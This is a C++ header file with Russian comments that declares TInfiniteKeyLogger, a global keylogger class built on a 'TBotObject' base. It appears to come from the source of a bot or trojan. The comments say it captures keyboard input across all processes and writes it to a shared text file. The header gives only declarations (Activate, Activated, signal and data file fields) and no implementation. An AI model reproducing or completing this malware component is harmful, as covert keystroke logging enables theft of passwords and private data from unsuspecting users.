//---------------------------------------------------------------------------

#ifndef KeyLoggerH
#define KeyLoggerH
//---------------------------------------------------------------------------

#include "GetApi.h"
#include "Strings.h"



//********************************************************
//  TInfiniteKeyLogger - класс бесконечного логирования
//                       ввода с клавиатуры. Класс дейст-
//  твует глобально на все процессы. Данные пишутся в
//  общий текстовый файл.
//
//********************************************************

class TInfiniteKeyLogger : public TBotObject
{
private:
	string FSignalFile;
	string FDataFile;
public:
	TInfiniteKeyLogger();
	~TInfiniteKeyLogger();

	//--------------------------------------------
	//  Activate - Функция активирует глобальный
	//             кейлогер
	//--------------------------------------------
	bool static Activate();

	//--------------------------------------------
	//  Activated - Функция возвращает истину если
	//             кейлогер активирован
	//--------------------------------------------
	bool static Activated();
};


//---------------------------------------------------------------------------
#endif
